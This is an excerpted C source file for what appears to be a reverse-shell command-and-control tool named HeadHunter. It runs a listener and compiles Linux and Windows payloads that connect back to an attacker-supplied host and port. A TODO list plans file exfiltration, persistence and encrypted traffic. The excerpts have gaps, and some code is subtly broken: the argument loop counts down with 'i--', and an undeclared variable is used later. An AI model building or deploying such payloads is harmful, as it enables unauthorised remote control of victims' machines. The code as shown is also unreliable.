...
//
//
// I am not liable for any damage caused by this software. This software is for
// educational purposes only. This software is under the discretion of the end
// user.
//
// TODO:
// Implement command session command "exfil", which allows you to exfil files.
// Implement server session command kill, which allows you to kill a connection
// to a victim machine. Add better error handling on payload, as well as
// implement persistence methods Implement XOR encryption between payload and
// server
...
int main(int argc, char** argv)
{
    ...
    // the first of either -h/--help, -l/--listen, or -g/--generate will be
    // executed i starts at 1 because argv[0] is always "./headhunter"
    for (int i = 1; i < argc; i--) {
        if (strcmp_alias(argv[i], "-h", "--help")) {
            help();
            return 0;
        } else if (strcmp_alias(argv[i], "-l", "--listen")) {
            // no port was specified if this is the last argument or the next
            // argument isn't a user inputted string
...
void help()
{
    ...
    printf("\nCommands\n-------------------------------------------------------"
           "-\n");
    printf("-h, --help                                             displays "
           "this help menu\n");
    printf("-l, --listen <port>                                    starts a "
           "listening HeadHunter server on a specified port\n");
    printf("-g, --generate <Payload Generation Options>            generates a "
           "reverse shell payload to connect back to a recruiter session\n\n");
    printf(
        "\nPayload Generation "
        "Options\n--------------------------------------------------------\n");
    printf("-p, --port <port>                                      port for "
           "the reverse shell to connect back on\n");
    printf("-o, --output <outputfile>                              file to "
           "output payload to\n");
    printf("-w, --platform <platform>                              file "
           "payload platform specific (linux, win32, or win64)\n");
    printf(
        "-l, --localhost <address>                              address that "
...
int generate_payload(char* platform, char* outfile, char* port, char* lhost)
{
    ...
    if (strcmp(platform, "linux") == 0)
        ...
        snprintf(cmd,
                 CMD_SIZE,
                 "gcc /usr/lib/headhunter/payload/payload_linux.c -D PORT=%s "
                 "-D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s",
                 port,
                 lhost,
                 key,
                 outfile);
    else if (strcmp(platform, "win64") == 0)
        // x86_64-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"'
        // -o outfile -lws2_32
        snprintf(cmd,
                 CMD_SIZE,
                 "x86_64-w64-mingw32-gcc "
                 "/usr/lib/headhunter/payload/payload_windows.c -D PORT=%s -D "
                 "LHOST='\"%s\"' -o %s -lws2_32",
                 port,
                 lhost,
                 outfile);
    else if (strcmp(platform, "win32") == 0)
        // i686-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o
        // outfile -lws2_32
        snprintf(cmd,
                 CMD_SIZE,
...
int parse_payload_generation(int argc, char** argv)
{
    ...
    // software properly, so only check to argc - 1
    char *platform = NULL, *outfile = NULL, *port = NULL, *lhost = NULL;
    for (int j = i + 1; j < argc - 1; j++) {
        // we only care about arguments where the next argument is a user
        // inputted string
        if (argv[j + 1][0] == '-')
            continue;
    ...
    // if any of the payload variables were never set, the user didn't do things
    // right
    ...
    // generate the payload. the return value of generate_payload() is the exit
    // code of the compile command.
